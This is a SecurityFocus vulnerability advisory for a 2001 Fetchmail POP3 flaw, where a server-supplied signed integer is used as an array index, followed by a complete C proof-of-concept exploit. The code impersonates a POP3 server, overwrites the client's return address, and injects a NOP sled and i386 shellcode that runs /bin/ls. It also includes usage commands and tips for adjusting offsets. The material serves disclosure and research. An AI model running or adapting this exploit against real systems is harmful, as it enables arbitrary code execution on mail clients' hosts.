source: http://www.securityfocus.com/bid/3164/info

Fetchmail is a unix utility for downloading email from mail servers via POP3.

Fetchmail contains a vulnerability that may allow for remote attackers to gain access to client systems. The vulnerability has to do with the use of a remotely supplied signed integer value as the index to an array when writing data to memory.

It is be possible for attackers to overwrite critical variables in memory with arbitrary values if the target client's POP3 server can be impersonated. Successful exploitation can lead to the exectution of arbitrary code on the client host. 

/* fetchmail proof of concepts i386 exploit
 * Copyright (C) 2001 Salvatore Sanfilippo <antirez@invece.org>
 * Code under the GPL license.
 *
 * Usage: ./a.out | nc -l -p 3333
 * fetchmail localhost -P 3333 -p POP3
 *
 * This is a bad exploit with offset carefully selected
 * to work in my own system. It will probably not work in
 * your system if you don't modify RETR_OFFSET and SHELL_PTR,
 * but you may try to set the SHELL_PTR to 0xAAAAAAAA
 * and use gdb to obtain the proof that your fetchmail is vulnerable
 * without to exploit it.
 * Or just read the code in pop3.c.
 *
 * To improve the exploit portability you may put the shellcode inside
 * one of the static char buffers, grep 'static char' *.c.
 *
 * Tested on fetchmail 5.8.15 running on Linux 2.4.6
 *
 * On success you should see the ls output.
 */

#include <stdio.h>

#define MESSAGES 10
#define RETR_OFFSET -20
#define SHELL_PTR 0xbfffba94

int main(void)
{
	int ish = SHELL_PTR;
	int ret_offset = -10;
	char shellcode[] = /* take the shellcode multiple of 4 in size */
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff/bin/ls\0\0";
	int *sc = (int*) shellcode;
	int noop = 0x90909090;
	int i;

	/* +OK for user and password, than report the number of messages */
	printf("+OK\r\n+OK\r\n+OK\r\n+OK %d 0\r\n+OK 0\r\n+OK\r\n", MESSAGES);
	/* Overwrite the RET pointer */
	for (i = ret_offset-20; i < ret_offset+20; i++)
		printf("%d %d\r\n", i, ish);
	/* Put some NOP */
	for (i = 1; i < 21; i++)
		printf("%d %d\r\n", i, noop);
	/* Put the shell code in the buffer */
	for (i = 21; i < 21+(sizeof(shellcode)/4); i++)
		printf("%d %d\r\n", i, *sc++);
	printf(".\r\n"); /* POP data term */
	return 0;
}
